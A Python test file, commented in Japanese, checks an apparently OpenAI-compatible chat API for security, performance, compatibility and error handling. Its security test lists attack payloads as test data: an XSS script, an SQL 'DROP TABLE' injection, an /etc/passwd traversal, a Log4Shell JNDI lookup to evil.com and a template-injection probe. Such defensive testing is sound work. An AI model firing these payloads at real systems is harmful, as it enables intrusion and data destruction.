#!/usr/bin/env python3
"""
品質保証チーム向け追加テスト
セキュリティ、パフォーマンス、互換性の観点から追加テスト
"""

import sys
import os
import time
import threading
import unittest
from unittest.mock import Mock, patch

# プロジェクトルートをパスに追加
project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, project_root)

from models import ChatMessage, ChatCompletionRequest
from utils import sanitize_message, generate_id, create_error_response


class SecurityTests(unittest.TestCase):
    """セキュリティテストクラス"""

    def test_injection_attack_prevention(self):
        """インジェクション攻撃防止テスト"""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/x}",
            "{{7*7}}",  # テンプレートインジェクション
        ]

        for malicious_input in malicious_inputs:
            message = ChatMessage(role="user", content=malicious_input)
            # モデルは入力をそのまま保持（エスケープは上位層で実施）
            self.assertEqual(message.content, malicious_input)

    def test_sensitive_data_sanitization(self):
        """機密データサニタイゼーションテスト"""
        sensitive_patterns = [
            "password=secret123",
            "token=abc123xyz",
            "api_key=sk-1234567890",
            "My secret is hidden",
            "PASSWORD: admin123"
        ]

        for pattern in sensitive_patterns:
            sanitized = sanitize_message(pattern)
            self.assertIn("***REDACTED***", sanitized)

    def test_large_input_handling(self):
        """大きな入力データ処理テスト"""
        # 10MB の入力（DoS攻撃シミュレーション）
        large_input = "x" * (10 * 1024 * 1024)

        # メモリ使用量を監視しながらテスト
        start_time = time.time()
        message = ChatMessage(role="user", content=large_input)
        end_time = time.time()

        # 処理時間が妥当範囲内であることを確認
        self.assertLess(end_time - start_time, 5.0)  # 5秒以内
        self.assertEqual(len(message.content), 10 * 1024 * 1024)


class PerformanceTests(unittest.TestCase):
    """パフォーマンステストクラス"""

    def test_id_generation_performance(self):
        """ID生成パフォーマンステスト"""
        start_time = time.time()

        # 1000個のIDを生成
        ids = [generate_id() for _ in range(1000)]

        end_time = time.time()

        # パフォーマンス確認
        self.assertLess(end_time - start_time, 1.0)  # 1秒以内

        # ユニーク性確認
        self.assertEqual(len(ids), len(set(ids)))

    def test_concurrent_request_handling(self):
        """並行リクエスト処理テスト"""
        results = []

        def create_message():
            message = ChatMessage(role="user", content="Test message")
            results.append(message)

        # 10個の並行スレッドで実行
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=create_message)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        # 全てのスレッドが正常に完了したことを確認
        self.assertEqual(len(results), 10)
        for result in results:
            self.assertEqual(result.content, "Test message")

    def test_memory_usage_with_large_messages(self):
        """大きなメッセージでのメモリ使用量テスト"""
        # 複数の大きなメッセージを作成
        messages = []
        for i in range(10):
            content = f"Large message {i}: " + "x" * 100000  # 100KB each
            message = ChatMessage(role="user", content=content)
            messages.append(message)

        # メッセージが正常に作成されることを確認
        self.assertEqual(len(messages), 10)
        for i, message in enumerate(messages):
            self.assertTrue(message.content.startswith(f"Large message {i}:"))


class CompatibilityTests(unittest.TestCase):
    """互換性テストクラス"""

    def test_openai_request_format_compatibility(self):
        """OpenAIリクエスト形式互換性テスト"""
        # OpenAI APIと同じ形式のリクエスト
        openai_request = {
            "model": "gpt-3.5-turbo",
            "messages": [
                {"role": "system", "content": "You are a helpful assistant."},
                {"role": "user", "content": "Hello!"}
            ],
            "max_tokens": 100,
            "temperature": 0.7,
            "top_p": 0.9,
            "stream": False
        }

        # Pydanticモデルでの解析
        messages = [ChatMessage(**msg) for msg in openai_request["messages"]]
        request = ChatCompletionRequest(
            model=openai_request["model"],
            messages=messages,
            max_tokens=openai_request["max_tokens"],
            temperature=openai_request["temperature"],
            top_p=openai_request["top_p"],
            stream=openai_request["stream"]
        )

        self.assertEqual(request.model, "gpt-3.5-turbo")
        self.assertEqual(len(request.messages), 2)
        self.assertEqual(request.temperature, 0.7)

    def test_error_response_format_compatibility(self):
        """エラーレスポンス形式互換性テスト"""
        error_resp = create_error_response("invalid_request", "Test error")

        # OpenAI APIと同じ構造であることを確認
        self.assertIn("error", error_resp)
        self.assertIn("code", error_resp["error"])
        self.assertIn("message", error_resp["error"])
        self.assertIn("type", error_resp["error"])

        # 適切なエラータイプ
        self.assertEqual(error_resp["error"]["type"], "invalid_request_error")

    def test_unicode_content_handling(self):
        """Unicode文字処理テスト"""
        unicode_contents = [
            "Hello 世界",  # 日本語
            "Bonjour 🌍",  # 絵文字
            "Здравствуй мир",  # ロシア語
            "مرحبا بالعالم",  # アラビア語
            "🚀🎉🔥💻",  # 絵文字のみ
        ]

        for content in unicode_contents:
            message = ChatMessage(role="user", content=content)
            self.assertEqual(message.content, content)


class ErrorHandlingTests(unittest.TestCase):
    """エラーハンドリングテストクラス"""

    def test_invalid_role_values(self):
        """無効なロール値テスト"""
        invalid_roles = ["", "invalid", "ADMIN", "root"]

        for role in invalid_roles:
            # その他の場合はモデルは受け入れる（バリデーションは別層）
            message = ChatMessage(role=role, content="Test")
            self.assertEqual(message.role, role)

        # Noneの場合はバリデーションエラーが期待される
        with self.assertRaises(Exception):  # PydanticのValidationError
            ChatMessage(role=None, content="Test")

    def test_empty_and_null_content(self):
        """空・NULL コンテンツテスト"""
        # 空文字列
        message = ChatMessage(role="user", content="")
        self.assertEqual(message.content, "")

        # スペースのみ
        message = ChatMessage(role="user", content="   ")
        self.assertEqual(message.content, "   ")

        # None は Function Calling 対応で有効（assistant role で function_call 時など）
        message = ChatMessage(role="assistant", content=None)
        self.assertIsNone(message.content)
        
        # function role でも content=None は有効
        message = ChatMessage(role="function", name="get_weather", content=None)
        self.assertIsNone(message.content)

    def test_extreme_parameter_values(self):
        """極端なパラメータ値テスト"""
        # 極端なtemperature値
        extreme_temps = [-1.0, 0.0, 0.1, 1.0, 2.0, 10.0, 100.0]

        for temp in extreme_temps:
            request = ChatCompletionRequest(
                model="gpt-3.5-turbo",
                messages=[ChatMessage(role="user", content="Test")],
                temperature=temp
            )
            self.assertEqual(request.temperature, temp)

        # 極端なmax_tokens値
        extreme_tokens = [0, 1, 100, 1000, 10000, 100000]

        for tokens in extreme_tokens:
            request = ChatCompletionRequest(
                model="gpt-3.5-turbo",
                messages=[ChatMessage(role="user", content="Test")],
                max_tokens=tokens
            )
            self.assertEqual(request.max_tokens, tokens)


def run_quality_tests():
    """品質保証テスト実行"""
    print("ChatGPT Selenium API - Quality Assurance Tests")
    print("=" * 60)

    loader = unittest.TestLoader()
    suite = unittest.TestSuite()

    # 全QAテストクラスを追加
    qa_test_classes = [
        SecurityTests,
        PerformanceTests,
        CompatibilityTests,
        ErrorHandlingTests
    ]

    for test_class in qa_test_classes:
        suite.addTests(loader.loadTestsFromTestCase(test_class))

    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    print("\n" + "=" * 60)
    print(f"QA Test Summary:")
    print(f"  Tests run: {result.testsRun}")
    print(f"  Failures: {len(result.failures)}")
    print(f"  Errors: {len(result.errors)}")
    print(f"  Skipped: {len(result.skipped) if hasattr(result, 'skipped') else 0}")

    if result.failures:
        print("\nFailures:")
        for test, traceback in result.failures:
            print(f"  - {test}: {traceback}")

    if result.errors:
        print("\nErrors:")
        for test, traceback in result.errors:
            print(f"  - {test}: {traceback}")

    success = len(result.failures) == 0 and len(result.errors) == 0

    if success:
        print("\n🎉 All QA tests passed!")
    else:
        print("\n❌ Some QA tests failed!")

    return success


if __name__ == "__main__":
    success = run_quality_tests()
    exit(0 if success else 1)
